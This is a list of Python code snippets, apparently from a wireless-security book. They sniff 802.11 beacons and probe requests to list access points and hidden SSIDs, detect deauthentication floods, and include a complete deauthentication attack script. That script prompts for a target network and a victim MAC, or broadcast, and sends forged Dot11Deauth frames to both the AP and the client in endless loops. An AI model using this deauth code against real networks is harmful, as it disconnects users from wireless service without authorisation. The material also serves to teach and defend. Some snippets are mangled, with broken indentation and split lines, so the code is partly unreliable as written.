["```py\n      import socket \n      import struct\n      import shelve \n      import sys\n      import traceback\n```", "```py\n      ch = raw_input(\"Press 'Y' to know previous result \")\n      print \"USE only Ctrl+c to exit \"\n```", "```py\n      try :\n        if ch.lower() == 'y':\n          s = shelve.open(\"wireless_data.dat\")\n          print \"Seq\", \"\\tBSSID\\t\\t\", \"\\tChannel\", \"SSID\"\n          keys= s.keys()\n          list1 = []\n          for each in keys:\n            list1.append(int(each))\n          list1.sort()\n\n          for key in list1:\n            key = str(key)\n            print key,\"\\t\",s[key][0],\"\\t\",s[key][1],\"\\t\",s[key][2]\n          s.close()\n          raw_input(\"Press any key to continue \")\n          except Exception as e :\n          print e\n          raw_input(\"Press any key to continue \")\n```", "```py\n      try:\n        sniff = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 3)\n        sniff.bind((\"mon0\", 0x0003))\n\n      except Exception as e :\n        print e \n```", "```py\n      ap_list =[]\n      print \"Seq\", \"\\tBSSID\\t\", \"\\t\\tChannel\", \"SSID\"\n      s = shelve.open(\"wireless_data.dat\",\"n\")\n```", "```py\n      try:\n        while True :\n          fm1 = sniff.recvfrom(6000)\n         fm= fm1[0]\n          radio_tap_lenght = ord(fm[2])\n          #print radio_tap_lenght\n          if fm[radio_tap_lenght] == \"\\x80\" :\n            source_addr = \n            fm[radio_tap_lenght+4+6:radio_tap_lenght+4+6+6]\n            #print source_addr\n            if source_addr not in ap_list:\n              ap_list.append(source_addr)\n              byte_upto_ssid = radio_tap_lenght+4+6+6+6+2+12+1\n              a = ord(fm[byte_upto_ssid])\n              list_val = []\n              #print a\n              bssid = ':'.join('%02x' % ord(b) for b in source_addr)\n              #bssid = fm[36:42].encode('hex')\n              s_rate_length = ord(fm[byte_upto_ssid+1 +a+1])\n              channel = ord(fm[byte_upto_ssid+1 +a+1+s_rate_length+3])\n              ssid = fm[byte_upto_ssid+1:byte_upto_ssid+1 +a]\n```", "```py\n        print len(ap_list),\"\\t\",bssid,\"\\t\",channel,\"\\t\",ssid\n        list_val.append(bssid)\n        list_val.append(channel)\n        list_val.append(ssid)\n        seq = str(len(ap_list))\n        s[seq]=list_val\n       except KeyboardInterrupt:\n        s.close()\n        sys.exit()\n\n       except Exception as e :\n       traceback.print_exc()\n        print e \n```", "```py\nfrom scapy.all import *\ninterface = 'mon0'\nap_list = []\ndef info(fm):\n  if fm.haslayer(Dot11):\n\n    if ((fm.type == 0) & (fm.subtype==8)):\n      if fm.addr2 not in ap_list:\n        ap_list.append(fm.addr2)\n        print \"SSID--> \",fm.info,\"-- BSSID --> \",fm.addr2\n\nsniff(iface=interface,prn=info)\n```", "```py\nfrom scapy.all import *\nimport struct\ninterface = 'mon0'\nap_list = []\ndef info(fm):\n  if fm.haslayer(Dot11):\n    if ((fm.type == 0) & (fm.subtype==8)):\n      if fm.addr2 not in ap_list:\n        ap_list.append(fm.addr2)\n        print \"SSID--> \",fm.info,\"-- BSSID --> \",fm.addr2, \"-- Channel-\n         -> \", ord(fm[Dot11Elt:3].info)\n        sniff(iface=interface,prn=info)\n```", "```py\n  root@Mohit|Raj:~# scapy\n  INFO: Can't import python gnuplot wrapper . Won't be able to plot.\n  WARNING: No route found for IPv6 destination :: (no default route?)\n  lWelcome to Scapy (2.2.0)\n  >>> ls(Dot11Elt)\n  ID         : ByteEnumField        = (0)\n  len        : FieldLenField        = (None)\n  info       : StrLenField          = ('')\n  >>>\n```", "```py\nclass Dot11Elt(Packet):\n  name = \"802.11 Information Element\"\n  fields_desc = [ ByteEnumField(\"ID\", 0, {0:\"SSID\", 1:\"Rates\", 2:  \n  \"FHset\", 3:\"DSset\", 4:\"CFset\", 5:\"TIM\", 6:\"IBSSset\", 16:\"challenge\",\n  42:\"ERPinfo\", 46:\"QoS Capability\", 47:\"ERPinfo\", 48:\"RSNinfo\",    \n  50:\"ESRates\",221:\"vendor\",68:\"reserved\"}),\n  FieldLenField(\"len\", None, \"info\", \"B\"),\n  StrLenField(\"info\", \"\", length_from=lambda x:x.len) ]\n```", "```py\n  >>> conf.iface=\"mon0\"\n  >>> frames = sniff(count=7)\n  >>> frames\n  <Sniffed: TCP:0 UDP:0 ICMP:0 Other:7>\n  >>> frames.summary()\n  RadioTap / 802.11 Management 8L 84:1b:5e:50:c8:6e > ff:ff:ff:ff:ff:ff   \n / Dot11Beacon / SSID='CITY PG3' / Dot11Elt / Dot11Elt / Dot11Elt /   \n  Dot11Elt / Dot11Elt / Dot11Elt / Dot11Elt / Dot11Elt / Dot11Elt / \n  Dot11Elt / Dot11Elt / Dot11Elt / Dot11Elt / Dot11Elt / Dot11Elt / \n  Dot11Elt / Dot11Elt / Dot11Elt\n  RadioTap / 802.11 Data 8L 84:1b:5e:50:c8:6e > 88:53:2e:0a:75:3f / \n  Dot11QoS / Dot11WEP\n  84:1b:5e:50:c8:6e > 88:53:2e:0a:75:3f (0x5f4) / Raw\n  RadioTap / 802.11 Control 13L None > 84:1b:5e:50:c8:6e / Raw\n  RadioTap / 802.11 Control 11L 64:09:80:cb:3b:f9 > 84:1b:5e:50:c8:6e / \n  Raw RadioTap / 802.11 Control 12L None > 64:09:80:cb:3b:f9 / Raw\n  RadioTap / 802.11 Control 9L None > 64:09:80:cb:3b:f9 / Raw\n```", "```py\nfrom scapy.all import *\ninterface ='mon0'\nprobe_req = []\nap_name = raw_input(\"Please enter the AP name \")\ndef probesniff(fm):\n  if fm.haslayer(Dot11ProbeReq):\n    client_name = fm.info\n    if client_name == ap_name :\n      if fm.addr2 not in probe_req:\n        print \"New Probe Request: \", client_name \n        print \"MAC \", fm.addr2\n        probe_req.append(fm.addr2)\nsniff(iface= interface,prn=probesniff)\n```", "```py\n      import socket \n      import sys\n```", "```py\n      sniff = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 3)\n```", "```py\n      mac_ap = raw_input(\"Enter the MAC \")\n      if \":\"in mac_ap:\n        mac_ap = mac_ap.replace(\":\",\"\")\n```", "```py\n      processed_client =[]\n      filter_dict = {64:'Probe request', 80:'Probe       response',32:'Reassociation request',16:'Association response',       0:'Association request' }\n      filter_type = filter_dict.keys()\n      probe_request_length = 4+6+6+6+2\n```", "```py\n      while True :\n        try:\n          fm1 = sniff.recvfrom(6000)\n          fm= fm1[0]\n          radio_tap_lenght = ord(fm[2])\n          if ord(fm[radio_tap_lenght]) in filter_type:\n      dest =fm[radio_tap_lenght+4:radio_tap_lenght+4+6].encode('hex')\n            source = fm[radio_tap_lenght+4+6       :radio_tap_lenght+4+6+6].encode('hex')\n            bssid = fm[radio_tap_lenght+4+6+6       :radio_tap_lenght+4+6+6+6].encode('hex')\n```", "```py\n      if mac_ap == source and dest not in processed_client :\n        processed_client.append(dest)\n```", "```py\n      if processed_client:\n        if ord(fm[radio_tap_lenght]) == 64:\n          if source in processed_client:\n            ssid_bit = probe_request_length+radio_tap_lenght+1\n            lenght_of_ssid= ord(fm[ssid_bit])\n            if lenght_of_ssid:\n              print \"SSID is \",       fm[ssid_bit+1:ssid_bit+1+lenght_of_ssid]\n```", "```py\n  except KeyboardInterrupt:\n    sniff.close()\n    print \"Bye\"\n    sys.exit()\n\n  except Exception as e :\n    print e\n```", "```py\n      from scapy.all import *\n      import shelve \n      import sys\n      import os\n      from threading import Thread\n```", "```py\n      def main():\n         interface = \"mon0\"\n         s = shelve.open(\"wireless_data.dat\")\n         print \"Seq\", \"\\tBSSID\\t\\t\", \"\\tChannel\", \"SSID\"\n         keys= s.keys()\n         list1 = []\n         for each in keys:\n            list1.append(int(each))\n            list1.sort()\n         for key in list1:\n            key = str(key)\n            print key,\"\\t\",s[key][0],\"\\t\",s[key][1],\"\\t\",s[key][2]\n         s.close()\n```", "```py\n        a = raw_input(\"Enter the seq number of wifi \")\n        r = shelve.open(\"wireless_data.dat\")\n        print \"Are you Sure to attack on \", r[a][0],\" \",r[a][2]\n        victim_mac = raw_input(\"Enter the victim MAC or for broadcast \n        press 0 \\t\")\n        if victim_mac=='0':\n          victim_mac =\"FF:FF:FF:FF:FF:FF\"\n```", "```py\n        cmd1 = \"iwconfig wlan1 channel \"+str(r[a][1])\n        cmd2 = \"iwconfig mon0 channel \"+str(r[a][1])\n        os.system(cmd1)\n        os.system(cmd2)\n```", "```py\n  BSSID = r[a][0]\n  frame= RadioTap()/ Dot11(addr1=BSSID,addr2=victim_mac, addr3=BSSID)/ \n  Dot11Deauth()\n  frame1= RadioTap()/ Dot11(addr1=victim_mac,addr2=BSSID, addr3=BSSID)/ \n  Dot11Deauth()\n```", "```py\n  if victim_mac!=\"FF:FF:FF:FF:FF:FF\":\n    t1 = Thread(target=for_ap, args=(frame,interface))\n    t1.start()\n  t2 = Thread(target=for_client, args=(frame1,interface))\n  t2.start()\n```", "```py\ndef for_ap(frame,interface):\n  while True:\n    sendp(frame, iface=interface, count=20, inter=.001)\n\ndef for_client(frame,interface):\n  while True:\n    sendp(frame, iface=interface, count=20, inter=.001)\n\nif __name__ == '__main__':\n  main()\n```", "```py\n      import socket \n      import Queue\n      from threading import Thread\n      from collections import Counter\n```", "```py\n      q1 = Queue.Queue()\n      co = Counter()\n```", "```py\n      try:\n        sniff = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 3)\n        sniff.bind((\"mon0\", 0x0003))\n      except Exception as e :\n        print e \n```", "```py\n      def ids():\n        global q1\n        while True :\n          fm1 = sniff.recvfrom(6000)\n          fm= fm1[0]\n          radio_tap_lenght = ord(fm[2])\n          if ord(fm[radio_tap_lenght]) == 192:\n      bssid1 = fm[radio_tap_lenght+4+6+6 :radio_tap_lenght+4+6+6+6]\n      bssid = ':'.join('%02x' % ord(b) for b in bssid1)\n      q1.put(bssid)\n```", "```py\n      def insert_frame():\n        global q1\n        while True:\n          mac=q1.get()\n          list1 = [mac]\n          co.update(list1)\n          print dict(co)\n```", "```py\n      i = Thread(target=ids)\n      f = Thread(target=insert_frame)\n      i.start()\n      f.start()\n```"]